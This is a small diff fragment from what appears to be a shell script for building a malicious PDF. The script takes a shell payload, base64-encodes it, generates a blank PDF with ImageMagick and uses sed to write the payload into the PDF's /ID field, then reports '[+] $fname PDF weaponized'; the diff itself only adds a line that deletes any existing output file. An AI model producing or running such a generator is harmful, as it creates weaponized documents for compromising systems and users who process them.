@@ -27,6 +27,7 @@ read shell
 
 payload=$(echo $shell | base64)
 
+rm $fname 2> /dev/null
 convert xc:none -page Letter $fname && 
 sed -i "s/^\/ID \[<.*> <.*>\]/\/ID \[<$payload> <$payload>\]/g" $fname &&
 echo "[+] $fname PDF weaponized"
